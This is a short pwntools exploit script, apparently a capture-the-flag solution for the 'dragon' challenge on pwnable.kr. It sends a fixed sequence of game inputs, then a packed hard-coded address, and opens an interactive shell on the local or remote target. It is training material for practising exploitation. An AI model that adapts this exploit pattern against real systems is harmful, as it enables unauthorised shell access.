#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
import sys
context.log_level = 'debug'

if sys.argv[1] == 'loc':
	io = process('./dragon')
else:
	io = remote('pwnable.kr',9004)

sys_addr = 0x08048DBF

def playGame():
	
	for i in range(4):
		io.sendline('1')
	for i in range(4):
		io.sendline('3\n3\n2\n')
	io.sendline(p32(sys_addr))

if __name__ == "__main__":
	
	playGame()
	io.interactive()

